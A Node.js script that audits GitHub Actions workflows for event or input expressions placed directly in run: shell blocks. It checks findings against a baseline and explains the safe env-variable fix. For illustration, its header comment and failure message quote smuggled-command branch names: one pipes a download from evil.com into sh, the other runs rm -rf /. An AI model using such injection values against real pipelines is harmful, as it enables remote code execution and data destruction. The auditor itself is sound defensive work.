#!/usr/bin/env node
/**
 * BI-860603DA / BI-5940955C — Actions code-injection auditor.
 *
 * Scans every workflow under .github/workflows/ for `${{ github.event.* }}`
 * expressions interpolated directly into `run:` shell blocks. This is the
 * pattern that GitHub Security flags as actions/code-injection/critical
 * (CWE-094) — a branch name like `'; curl evil.com | sh; #` becomes shell
 * code when the runtime substitutes it.
 *
 * The safe pattern is to pass `github.event.*` values through an `env:`
 * block and reference them as shell variables, which the runtime then
 * quotes correctly:
 *
 *     env:
 *       HEAD_REF: ${{ github.event.pull_request.head.ref }}
 *     run: |
 *       git push origin "HEAD:${HEAD_REF}"
 *
 * Why this auditor exists alongside CodeQL
 * ----------------------------------------
 * CodeQL already detects this (default-setup `actions/code-injection/*`).
 * This auditor adds:
 *   - Speed:        runs in seconds on PR open, doesn't wait for CodeQL.
 *   - Independence: catches the pattern even if CodeQL is misconfigured
 *                   or its actions queries are disabled.
 *   - Visibility:   the workflow name "Actions Injection Audit" makes the
 *                   invariant legible to future engineers.
 *
 * Baseline
 * --------
 * Existing accepted occurrences are listed in
 * docs/security/actions-injection-baseline.json. They are tracked for
 * burn-down via BI-5940955C. New occurrences (not in the baseline) fail.
 *
 * Run locally:
 *   node scripts/security/check-actions-injection.mjs
 *
 * Exit codes:
 *   0  No new violations.
 *   1  New violations introduced.
 *   2  Configuration error.
 */

import { readFile, readdir } from "node:fs/promises";
import { join, relative, sep } from "node:path";

const WORKFLOWS_DIR = ".github/workflows";
const BASELINE_PATH = process.env.BASELINE_PATH ?? "docs/security/actions-injection-baseline.json";

// Match `${{ github.event.* }}` and `${{ inputs.* }}` — both are
// attacker-influenced in pull_request_target / workflow_dispatch contexts.
const DANGEROUS_EXPR = /\$\{\{\s*(github\.event\.|inputs\.)/;

/**
 * Find `${{ github.event.* }}` (or `inputs.*`) occurrences that appear
 * inside a `run:` block of a workflow. Single-line `run: foo ${{ ... }}`
 * counts. Multi-line `run: |` blocks count for any indented line.
 *
 * We deliberately ignore other contexts (`if:`, `with:` for non-script
 * actions, `env:` blocks) because the GitHub Actions runtime quotes those
 * as values, not shell input. The `with:` context for `actions/github-script`
 * IS dangerous, but encoding that exception accurately requires a real
 * YAML parser — left for a follow-up.
 */
function findViolations(content) {
  const lines = content.split(/\r?\n/);
  const violations = [];
  let inMultilineRun = false;
  let runIndent = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim() === "") continue;
    // Indent for block-scope tracking = position of first non-whitespace
    // character, whether it's `-` (array item) or a key like `run`.
    const indent = line.search(/\S/);

    // Exit multiline run block when indentation drops to or below run: level.
    if (inMultilineRun && indent <= runIndent) {
      inMultilineRun = false;
    }

    // Detect entry into a multiline run block. Both `run: |` and `- run: |`
    // are supported (array-item-as-step vs. key-in-step). YAML accepts `|`,
    // `|+`, `|-`, `>`, `>-`, `>+` as block scalar indicators.
    const multilineRunStart = line.match(/^\s*-?\s*run:\s*[|>][+-]?\s*$/);
    if (multilineRunStart) {
      inMultilineRun = true;
      runIndent = indent;
      continue;
    }

    // Detect single-line run: command form. Both `run: cmd` and `- run: cmd`.
    const singleLineRun = line.match(/^\s*-?\s*run:\s+(.+?)\s*$/);
    if (singleLineRun && !singleLineRun[1].startsWith("|") && !singleLineRun[1].startsWith(">")) {
      if (DANGEROUS_EXPR.test(singleLineRun[1])) {
        violations.push({
          line: i + 1,
          snippet: singleLineRun[1].slice(0, 200),
          context: "single-line run",
        });
      }
      continue;
    }

    if (inMultilineRun && DANGEROUS_EXPR.test(line)) {
      violations.push({
        line: i + 1,
        snippet: line.trim().slice(0, 200),
        context: "multi-line run",
      });
    }
  }

  return violations;
}

async function listWorkflowFiles(dir) {
  const entries = await readdir(dir, { withFileTypes: true });
  const out = [];
  for (const ent of entries) {
    if (ent.isFile() && (ent.name.endsWith(".yml") || ent.name.endsWith(".yaml"))) {
      out.push(join(dir, ent.name));
    }
  }
  return out.sort();
}

function normalizeRelativePath(p) {
  // Force forward slashes for cross-platform baseline comparison.
  return relative(process.cwd(), p).split(sep).join("/");
}

let baseline;
try {
  baseline = JSON.parse(await readFile(BASELINE_PATH, "utf8"));
} catch (err) {
  if (err.code === "ENOENT") {
    console.error(`ERROR: Baseline not found at ${BASELINE_PATH}.`);
    console.error("If this is intentional (no accepted occurrences), create a baseline file with:");
    console.error('  {"description": "...", "occurrences": []}');
    process.exit(2);
  }
  console.error(`ERROR: Could not read baseline: ${err.message}`);
  process.exit(2);
}

if (!Array.isArray(baseline.occurrences)) {
  console.error("ERROR: Baseline must have an 'occurrences' array.");
  process.exit(2);
}

// Build a Set of "file:line" pairs that are accepted.
const accepted = new Set(baseline.occurrences.map((o) => `${o.file}:${o.line}`));

let workflowFiles;
try {
  workflowFiles = await listWorkflowFiles(WORKFLOWS_DIR);
} catch (err) {
  console.error(`ERROR: Could not list ${WORKFLOWS_DIR}: ${err.message}`);
  process.exit(2);
}

const allViolations = [];
for (const file of workflowFiles) {
  const rel = normalizeRelativePath(file);
  const content = await readFile(file, "utf8");
  for (const v of findViolations(content)) {
    allViolations.push({ file: rel, ...v });
  }
}

const introduced = allViolations.filter((v) => !accepted.has(`${v.file}:${v.line}`));
const baselineNotFound = baseline.occurrences.filter(
  (o) => !allViolations.some((v) => v.file === o.file && v.line === o.line),
);

console.log(`Workflows scanned: ${workflowFiles.length}`);
console.log(`Baseline accepts:  ${baseline.occurrences.length} occurrence(s)`);
console.log(`Currently found:   ${allViolations.length} occurrence(s)`);
console.log("");

if (baselineNotFound.length > 0) {
  console.log(`ℹ ${baselineNotFound.length} baseline occurrence(s) no longer present in the code:`);
  for (const o of baselineNotFound) {
    console.log(`   ${o.file}:${o.line}  (was: ${o.snippet ?? "?"})`);
    if (o.trackedBy) console.log(`   tracked by: ${o.trackedBy}`);
  }
  console.log("   Consider regenerating the baseline.");
  console.log("");
}

if (introduced.length === 0) {
  console.log("✓ Actions injection audit PASSED — no new `${{ github.event.* }}` or `${{ inputs.* }}` in run: blocks.");
  process.exit(0);
}

console.error(`✗ Actions injection audit FAILED — ${introduced.length} new violation(s):`);
console.error("");
for (const v of introduced) {
  console.error(`  ${v.file}:${v.line}  (${v.context})`);
  console.error(`     ${v.snippet}`);
  console.error("");
}

console.error("Why this matters");
console.error("----------------");
console.error("Interpolating `${{ github.event.* }}` into a `run:` block lets the");
console.error("GitHub Actions runtime substitute attacker-controlled values directly");
console.error("into the shell command — a branch name like `'; rm -rf /; #` becomes");
console.error("shell code. This is GitHub Security alert `actions/code-injection/critical`");
console.error("(CWE-094) and is what enabled BI-5940955C.");
console.error("");
console.error("How to fix");
console.error("----------");
console.error("Pass the value through an `env:` block and reference the env var in shell:");
console.error("");
console.error("    env:");
console.error("      HEAD_REF: ${{ github.event.pull_request.head.ref }}");
console.error("    run: |");
console.error('      git push origin "HEAD:${HEAD_REF}"');
console.error("");
console.error("The runtime quotes env values correctly. The shell then sees a normal");
console.error("variable, not interpolated code.");
console.error("");
console.error("Reference: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable");

process.exit(1);
